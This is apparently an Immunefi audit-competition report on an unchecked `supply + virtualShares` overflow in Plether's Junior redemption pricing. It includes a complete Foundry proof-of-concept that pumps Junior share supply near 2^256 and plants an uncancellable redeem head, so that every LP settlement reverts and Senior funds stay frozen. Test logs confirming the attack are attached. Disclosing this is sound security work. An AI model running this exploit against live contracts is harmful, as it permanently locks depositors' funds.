# \#99200 [SC-Critical] Unchecked `supply + virtualShares` in Junior redemption pricing lets anyone plant an uncancellable redeem head that reverts every `settleLpEpoch` forever

**Submitted on Nov 12th 2026 at 11:20:21 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99200
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Permanent freezing of funds

## Description

## Brief/Intro

Every LP settlement prices each matured Junior redeem head with `mulDiv(shares, principal + 1, supply + 1000)`. The `supply + 1000` add is unchecked against headroom. The library NatSpec assumes it always fits `uint256`.

An unprivileged attacker can place Junior supply in the last 1000 values below `2^256`, and queue one Junior redeem request that matures one epoch later. Once that head matures:
- every `settleLpEpoch` reverts with Panic(0x11);
- the head cannot be cancelled, and nothing else removes it;
- the revert happens before the pause, oracle-frozen and zero-NAV early exits, so none of them restore settlement.

Senior and Junior redemptions are never funded again and pending deposits never activate. No owner action is needed, and no owner action fixes it.

## Vulnerability Details

**The unchecked add.**

```solidity
// src/libraries/HousePoolRedemptionMathLib.sol:45-46
uint256 grossAssets =
@>  Math.mulDiv(shares, principal + virtualAssets, supply + virtualShares, Math.Rounding.Floor);
```

The NatSpec at `:7-10` states the assumption this relies on: "Canonical principal and supply are bounded protocol accounting values, so adding their configured offsets must fit `uint256`". Nothing in the protocol enforces that bound. The same add exists in `TrancheVault._convertToSharesUsingAssets` / `_convertToAssetsUsingAssets` (`src/TrancheVault.sol:1858`, `:1866`).

**It runs for every matured Junior redeem head, before any guard.**

`HousePool._fundRedemptionPhase` calls `netAssetsForShares(remainingShares, pricingPrincipal, pricingSupply, 1, 1000, feeBps)` for the queue head (`src/HousePool.sol:957-959`). This happens before the budget check and before the zero-payout refund branch (`:960-982`), so the size of the head does not matter.

The Junior redemption phase (`:881-884`) runs before:
- the `paused()` early return (`:903`);
- the oracle-frozen entry deferral `_entriesMaySettle` (`:908`);
- the zero-principal activation deferral (`:917`).

So the revert also happens on weekends, while the pool is paused, and when Junior principal is exactly 0 (`principal + 1` is fine; `supply + 1000` still overflows). Guarding only the deposit/activation path does not restore settlement.

**The head is permanent.**

`cancelRedeemRequest` reverts once `currentLpEpoch() >= requestId` (`src/TrancheVault.sol:894`). No admin function removes or refunds a head. Supply can only go down through redemption burns, and those are inside the reverting phase.

**Supply can be placed in that window by anyone.**

A Junior deposit activates at dust NAV with no price floor (HP:915-920, TV:1407-1409), and the Senior coupon drains the deposited USDG back out (HousePoolWaterfallAccountingLib.sol:76-77). The attacker controls the final supply to about 1e-6 of max through the deposit size: one atom of `d` adds about `N/(x+1)` shares.

## Impact Details

1.  Senior principal frozen.
2. New deposits are frozen.
3. No trusted cure was found.
4. **Invariant broken:** LP settlement liveness. HousePoolRedemptionMathLib's stated assumption that `supply + virtualShares` fits in `uint256` (:7-10) does not hold.

## References

- packages/perps/src/libraries/HousePoolRedemptionMathLib.sol
- packages/perps/src/HousePool.sol:915-917
- 



## Proof of Concept

## Proof of Concept

Add this test in test file

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {console2} from "forge-std/console2.sol";

/// Place at packages/perps/test/perps/JuniorSupplyVirtualShareOverflowBrick.t.sol and run:
///   forge test --root packages/perps --match-path test/perps/JuniorSupplyVirtualShareOverflowBrick.t.sol -vv --gas-limit 100000000000 --disable-block-gas-limit
/// YM01: untrusted-only permanent LP-settlement brick.
/// B15 pump lands Junior supply near 2^256; a final settle burns a precisely chosen Junior redemption (1-share
/// granularity) and then activates a deposit so that supply lands in (2^256-1-1000, 2^256-1]. From then on
/// `supply + VIRTUAL_SHARES` (1000) overflows in HousePoolRedemptionMathLib.netAssetsForShares, which every settle
/// evaluates for a matured Junior redeem head (pre-queued by the attacker, uncancellable once matured). The Junior
/// redemption phase runs on weekdays AND oracle-frozen weekends, so every settle reverts with no owner action.
abstract contract YM01Base is BasePerpTest {

    address JA = address(0x1A1);
    address SA = address(0x5A1);
    address SB = address(0x5B1);
    address T = address(0x7A1);
    address ATK = address(0xA77);
    address C = address(0xA78); // holds the fine-tune burn
    address DD = address(0xA79); // holds the brick redeem head
    address H = address(0x4A1);

    uint256 constant YEAR = 365 days;
    uint256 constant MAXU = type(uint256).max;
    uint256 constant T2 = MAXU - MAXU / 50; // pre-landing target, 98 % of max

    function _shareBps() internal pure virtual returns (uint256);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        if (_shareBps() != pool.maxSeniorShareBps()) {
            _setSeniorCapacity(pool.maxSeniorExposureAssets(), _shareBps());
            vm.warp(vm.getBlockTimestamp() + 4 days); // keep the same weekday as the fixture start
        }
        _fundJunior(JA, 250_000e6);
        _fundSenior(SA, 600_000e6);
        _fundSenior(SB, 150_000e6);
    }

    // ---------------- helpers ----------------
    function _markAt(
        uint256 px,
        uint256 ts
    ) internal {
        if (ts <= engine.lastMarkTime()) {
            ts = uint256(engine.lastMarkTime()) + 1;
        }
        if (vm.getBlockTimestamp() < ts) {
            vm.warp(ts);
        }
        vm.prank(address(router));
        engine.updateMarkPrice(px, SafeCast.toUint64(vm.getBlockTimestamp()));
    }

    function _mark(
        uint256 px
    ) internal {
        _markAt(px, vm.getBlockTimestamp() + 1);
    }

    function _projJ() internal view returns (uint256 j) {
        (, j) = pool.getPendingDepositTrancheState();
    }

    function _projS() internal view returns (uint256 s) {
        (s,) = pool.getPendingDepositTrancheState();
    }

    function _due(
        uint256 s,
        uint256 dt
    ) internal view returns (uint256) {
        return (s * pool.seniorRateBps() * dt) / (10_000 * YEAR);
    }

    function _req(
        uint256 exposure
    ) internal view returns (uint256) {
        uint256 m = pool.maxSeniorShareBps();
        return Math.mulDiv(exposure, 10_000 - m, m, Math.Rounding.Ceil);
    }

    function settleExt() external returns (IHousePool.LpEpochSettlementResult memory) {
        return _settleLpEpochForTest();
    }

    // ---------------- honest junior loss leaving dust (B15 recipe) ----------------
    function _lossSequence(
        uint256 units
    ) internal {
        _mark(1.7e8);
        if (units > 0) {
            _close(T, CfdTypes.Side.SHORT, units * 100e18, 1.7e8);
        }
        _mark(1e8);
        if (units < 4000) {
            _close(T, CfdTypes.Side.SHORT, (4000 - units) * 100e18, 1e8);
        }
    }

    function _wipeToDust() internal {
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        _fundTrader(T, 600_000e6);
        _mark(1e8);
        _open(T, CfdTypes.Side.SHORT, 400_000e18, 300_000e6, 1e8);
        uint256 lo = 0;
        uint256 hi = 4000;
        while (lo < hi) {
            uint256 mid = (lo + hi + 1) / 2;
            uint256 snap = vm.snapshotState();
            _lossSequence(mid);
            uint256 j = _projJ();
            vm.revertToStateAndDelete(snap);
            if (j > 0) {
                lo = mid;
            } else {
                hi = mid - 1;
            }
        }
        _lossSequence(lo);
        vm.prank(SA);
        seniorVault.requestRedeem(1e9, SA, SA);
        _markAt(1e8, vm.getBlockTimestamp() + 2 hours);
        require(_projJ() > 0, "dust gone");
        _settleLpEpochForTest();
    }

    // ---------------- attacker pump (B15) ending with one larger deposit ----------------
    function _cycle(
        uint256 d,
        uint256 dt,
        uint256 x
    ) internal {
        uint256 t0 = pool.lastSeniorCouponCheckpointTime();
        vm.prank(ATK);
        uint256 reqId = juniorVault.requestDeposit(d, ATK, ATK);
        uint256 tSettle = t0 + dt;
        require(tSettle >= juniorVault.depositEpochStart(reqId), "settle before maturity");
        _markAt(1e8, tSettle);
        require(!engine.isOracleFrozen(), "frozen");
        require(_projJ() == x, "x model");
        _settleLpEpochForTest();
        uint256 claimable = juniorVault.claimableDepositRequest(reqId, ATK);
        require(claimable == d, "not activated");
        vm.prank(ATK);
        juniorVault.claimDeposit(reqId, claimable, ATK, ATK);
    }

    function _pump(
        uint256 dBig
    ) internal returns (uint256 cycles, uint256 spent) {
        settlementToken.mint(ATK, 2_000_000e6);
        vm.prank(ATK);
        settlementToken.approve(address(juniorVault), MAXU);
        uint256 rate = pool.seniorRateBps();
        for (uint256 i; i < 40; i++) {
            uint256 J = pool.juniorPrincipal();
            uint256 S = pool.seniorPrincipal();
            uint256 N = juniorVault.accruedTotalSupply();
            require(J > 0 && S == pool.seniorHighWaterMark(), "precondition");
            uint256 dtMax = (J * 10_000 * YEAR - 1) / (S * rate);
            uint256 xMin = J - _due(S, dtMax);
            uint256 xT = Math.mulDiv(dBig, N + 1000, T2 - N) + 1;
            uint256 d;
            uint256 dt;
            uint256 x;
            bool last;
            if (xT >= xMin) {
                require(xT < J, "overshoot");
                dt = ((J - xT) * 10_000 * YEAR) / (S * rate);
                x = J - _due(S, dt);
                d = Math.mulDiv(T2 - N, x + 1, N + 1000);
                last = true;
            } else {
                d = _due(S, 3 hours);
                if (d < 1e6) d = 1e6;
                dt = dtMax;
                x = xMin;
                if (x < 2 * xT) {
                    dt = ((J - 2 * xT) * 10_000 * YEAR) / (S * rate);
                    x = J - _due(S, dt);
                }
            }
            _cycle(d, dt, x);
            spent += d;
            cycles++;
            console2.log("cycle", cycles);
            console2.log("  junior NAV at activation x (atoms)", x);
            console2.log("  deposit d (atoms)", d);
            console2.log("  junior supply after", juniorVault.totalSupply());
            if (last) return (cycles, spent);
        }
        revert("pump did not converge");
    }

    // ---------------- exact landing math (off-chain equivalent) ----------------
    function _f(
        uint256 n0,
        uint256 d,
        uint256 a
    ) internal pure returns (bool ok, uint256 nf) {
        uint256 m = Math.mulDiv(d, n0 + 1000, a);
        if (m > MAXU - n0) return (false, 0);
        return (true, n0 + m);
    }

    /// largest n0 with n0 + floor(d*(n0+1000)/a) <= MAXU
    function _solveN0(
        uint256 d,
        uint256 a
    ) internal pure returns (uint256 lo) {
        uint256 hi = MAXU - 1000;
        while (lo < hi) {
            uint256 mid = lo + (hi - lo + 1) / 2;
            (bool ok,) = _f(mid, d, a);
            if (ok) lo = mid;
            else hi = mid - 1;
        }
    }

    struct Plan {
        uint256 tf;
        uint256 eReq;
        uint256 jf;
        uint256 n2;
        uint256 req;
        uint256 jTarget;
        uint256 p;
        uint256 b;
        uint256 d;
        uint256 nf;
    }

    function _plan() internal returns (Plan memory pl) {
        (pl.eReq,) = juniorVault.getRequestEpochWindow();
        pl.tf = juniorVault.depositEpochStart(pl.eReq);
        uint256 snap = vm.snapshotState();
        _markAt(1e8, pl.tf);
        require(!engine.isOracleFrozen(), "frozen at tf");
        pl.jf = _projJ();
        uint256 sP = _projS();
        uint256 hwm = pool.seniorHighWaterMark();
        vm.revertToStateAndDelete(snap);
        pl.n2 = juniorVault.totalSupply();
        uint256 exposure = (sP > hwm ? sP : hwm) + pool.reservedSeniorDepositAssets();
        pl.req = _req(exposure + 1e6);
        pl.jTarget = pl.req + 2e6;
        require(pl.jf > pl.jTarget + 1, "junior too small for a fundable burn");
        pl.p = pl.jf - pl.jTarget;
        uint256 bLo = Math.mulDiv(pl.p, pl.n2 + 1000, pl.jf + 1, Math.Rounding.Ceil);
        uint256 bHi = Math.mulDiv(pl.p + 1, pl.n2 + 1000, pl.jf + 1, Math.Rounding.Ceil) - 1;
        uint256 bMid = bLo + (bHi - bLo) / 2;
        uint256 n0t = pl.n2 - bMid;
        uint256 a = pl.jTarget + 1;
        pl.d = Math.mulDiv(a, MAXU - n0t, n0t + 1000);
        require(pl.d >= 1e6, "d below min deposit");
        uint256 n0 = _solveN0(pl.d, a);
        pl.b = pl.n2 - n0;
        require(pl.b >= bLo && pl.b <= bHi, "burn outside p-interval");
        (bool ok, uint256 nf) = _f(n0, pl.d, a);
        require(ok && nf > MAXU - 1000, "landing not in window");
        pl.nf = nf;
    }

    // ---------------- the attack ----------------
    function _brick() internal returns (Plan memory pl) {
        _wipeToDust();
        assertEq(pool.seniorPrincipal(), pool.seniorHighWaterMark(), "senior unimpaired");
        console2.log("after loss: junior principal", pool.juniorPrincipal());
        console2.log("after loss: senior principal", pool.seniorPrincipal());
        console2.log("maxSeniorShareBps", pool.maxSeniorShareBps());
        uint256 t0 = vm.getBlockTimestamp();
        uint256 dBig = _req(pool.seniorPrincipal() + 1e6) + 100e6;
        (uint256 cycles, uint256 spent) = _pump(dBig);
        console2.log("pump cycles", cycles);
        console2.log("pump USDG deposited (atoms)", spent);

        // shares become transferable 1 h after the last activation
        vm.warp(vm.getBlockTimestamp() + 1 hours + 1);
        pl = _plan();
        console2.log("final settle at epoch start", pl.tf);
        console2.log("  predicted junior NAV Jf", pl.jf);
        console2.log("  supply before N2", pl.n2);
        console2.log("  junior ratio requirement req", pl.req);
        console2.log("  fine-tune burn B (shares)", pl.b);
        console2.log("  burn payout p", pl.p);
        console2.log("  final deposit d", pl.d);
        console2.log("  predicted final supply headroom to 2^256-1", MAXU - pl.nf);

        uint256 k = 1e60;
        vm.startPrank(ATK);
        juniorVault.transfer(C, pl.b);
        juniorVault.transfer(DD, k);
        vm.stopPrank();
        vm.prank(C);
        uint256 r1 = juniorVault.requestRedeem(pl.b, C, C);
        assertEq(r1, pl.eReq, "burn epoch");
        vm.prank(ATK);
        uint256 dq = juniorVault.requestDeposit(pl.d, ATK, ATK);
        assertEq(dq, pl.eReq, "deposit epoch");
        // the brick head: requested after the cutoff, so it matures one epoch later
        vm.warp(pl.tf - 100);
        vm.prank(DD);
        uint256 r2 = juniorVault.requestRedeem(k, DD, DD);
        assertEq(r2, pl.eReq + 1, "brick epoch");

        _markAt(1e8, pl.tf);
        assertEq(_projJ(), pl.jf, "Jf model");
        _settleLpEpochForTest();
        uint256 nf = juniorVault.totalSupply();
        console2.log("final junior supply headroom to 2^256-1", MAXU - nf);
        assertEq(nf, pl.nf, "landing");
        assertGt(nf, MAXU - 1000, "supply + VIRTUAL_SHARES now overflows");
        console2.log("burn holder C got USDG", juniorVault.maxWithdraw(C));
        console2.log("attack wall-clock hours", (vm.getBlockTimestamp() - t0) / 3600);
        console2.log("junior principal left (attacker-owned, locked)", pool.juniorPrincipal());
        console2.log("attacker USDG net out of pocket", 2_000_000e6 - settlementToken.balanceOf(ATK));
    }

    function test_YM01_untrustedPermanentBrick() public {
        _brick();

        // victims: a Senior LP asks to exit 1/3, an honest Junior LP deposits 10k after the brick
        uint256 sShares = seniorVault.maxRequestRedeem(SA) / 3;
        vm.prank(SA);
        seniorVault.requestRedeem(sShares, SA, SA);
        settlementToken.mint(H, 10_000e6);
        vm.startPrank(H);
        settlementToken.approve(address(juniorVault), 10_000e6);
        uint256 hReq = juniorVault.requestDeposit(10_000e6, H, H);
        vm.stopPrank();

        uint256 seniorVaultBal0 = settlementToken.balanceOf(address(seniorVault));
        uint256 seniorPrincipal0 = pool.seniorPrincipal();

        uint256 attempts;
        uint256 reverts;
        uint256 frozenAttempts;
        uint256 frozenReverts;
        bytes memory lastErr;
        for (uint256 h = 0; h < 24 * 30; h++) {
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            bool frozen = engine.isOracleFrozen();
            if (!frozen) {
                vm.prank(address(router));
                try engine.updateMarkPrice(1e8, SafeCast.toUint64(vm.getBlockTimestamp())) {} catch {}
            }
            attempts++;
            if (frozen) frozenAttempts++;
            try this.settleExt() {}
            catch (bytes memory e) {
                reverts++;
                if (frozen) frozenReverts++;
                lastErr = e;
            }
        }
        console2.log("settle attempts over 30 days", attempts);
        console2.log("  of which oracle-frozen weekend", frozenAttempts);
        console2.log("  reverted", reverts);
        console2.log("  frozen-window reverted", frozenReverts);
        console2.logBytes(lastErr);
        assertEq(reverts, attempts, "every settle reverts");
        assertEq(frozenReverts, frozenAttempts, "weekend exits closed too");
        assertGt(frozenAttempts, 0, "weekend covered");
        assertEq(keccak256(lastErr), keccak256(abi.encodeWithSelector(bytes4(0x4e487b71), uint256(0x11))), "Panic 0x11");
        assertEq(settlementToken.balanceOf(address(seniorVault)), seniorVaultBal0, "senior exit never funded");
        console2.log("senior principal frozen (USDG atoms)", pool.seniorPrincipal());
        console2.log("senior principal at brick (USDG atoms)", seniorPrincipal0);

        // honest junior depositor cannot cancel a matured request
        vm.prank(H);
        try juniorVault.cancelPendingDeposit(hReq) {
            console2.log("H cancel ok");
        } catch (bytes memory e) {
            console2.log("H cancel reverts");
            console2.logBytes(e);
        }
        // nobody can queue a new junior redeem either (estimate overflows)
        vm.prank(ATK);
        try juniorVault.requestRedeem(1e70, ATK, ATK) {
            console2.log("new junior redeem request ok");
        } catch (bytes memory e) {
            console2.log("new junior redeem request reverts");
            console2.logBytes(e);
        }
        // attacker cannot cancel the matured brick head either
        vm.prank(DD);
        try juniorVault.cancelRedeemRequest(juniorVault.currentLpEpoch() - 1, DD, DD) {
            console2.log("brick head cancel ok");
        } catch {
            console2.log("brick head cancel reverts");
        }
    }

    /// Escape analysis: a Senior LP that spreads redeem requests over > 16 matured epochs makes the Senior phase hit
    /// the per-phase work cap; settlement then returns before the Junior phase (HP:869-875).
    function test_YM01_seniorWorkCapEscape() public {
        _brick();
        uint256 bal0 = settlementToken.balanceOf(address(seniorVault));
        uint256 per = seniorVault.maxRequestRedeem(SB) / 17;
        for (uint256 i; i < 17; i++) {
            vm.prank(SB);
            seniorVault.requestRedeem(per, SB, SB);
            vm.warp(vm.getBlockTimestamp() + 1 hours);
            if (!engine.isOracleFrozen()) _mark(1e8);
            try this.settleExt() {
                console2.log("settle ok at step", i);
            } catch {}
        }
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        if (!engine.isOracleFrozen()) _mark(1e8);
        try this.settleExt() returns (IHousePool.LpEpochSettlementResult memory r) {
            console2.log("work-cap settle ok; senior funded assets", r.seniorFundedAssets);
            console2.log("  senior processed epochs", r.seniorProcessedEpochs);
        } catch (bytes memory e) {
            console2.log("work-cap settle reverts");
            console2.logBytes(e);
        }
        console2.log("senior vault USDG gained", settlementToken.balanceOf(address(seniorVault)) - bal0);
    }
}

contract YM01FixtureShareTest is YM01Base {
    function _shareBps() internal pure override returns (uint256) {
        return 9999; // BasePerpTest default (TEST_MAX_SENIOR_SHARE_BPS)
    }
}

contract YM01ReleaseShareTest is YM01Base {
    function _shareBps() internal pure override returns (uint256) {
        return 8000; // DEPLOYMENT.md:155 release value
    }
}
```

### Result
```
YM01FixtureShareTest
[PASS] test_YM01_untrustedPermanentBrick() (gas: 147370506)
  pump cycles 15
  final junior supply headroom to 2^256-1 0
  burn holder C got USDG 87651482
  attack wall-clock hours 45
  attacker USDG net out of pocket 554313377
  settle attempts over 30 days 720
    of which oracle-frozen weekend 191
    reverted 720
    frozen-window reverted 191
  0x4e487b710000000000000000000000000000000000000000000000000000000000000011
  senior principal frozen (USDG atoms) 751347504859
  H cancel ok                         (J drained to 0 by coupon -> projected wipe allows cancel)
  new junior redeem request reverts   (Panic 0x11)
  brick head cancel reverts
[PASS] test_YM01_seniorWorkCapEscape() (gas: 34921939)
  settle ok at step 16
  work-cap settle reverts  (Panic 0x11, only 1 head left)
  senior vault USDG gained 141262882464

YM01ReleaseShareTest (maxSeniorShareBps 8000)
[PASS] test_YM01_untrustedPermanentBrick() (gas: 146948627)
  pump cycles 14
  final junior supply headroom to 2^256-1 1
  attack wall-clock hours 40
  junior principal left (attacker-owned, locked) 191702771626
  attacker USDG net out of pocket 192006287977
  settle attempts over 30 days 720 / frozen 192 / reverted 720 / frozen-window reverted 192
  senior principal frozen (USDG atoms) 751314731434
  H cancel reverts 0x1ad6d803
[PASS] test_YM01_seniorWorkCapEscape() (gas: 34255084)
  senior vault USDG gained 141256432352
```
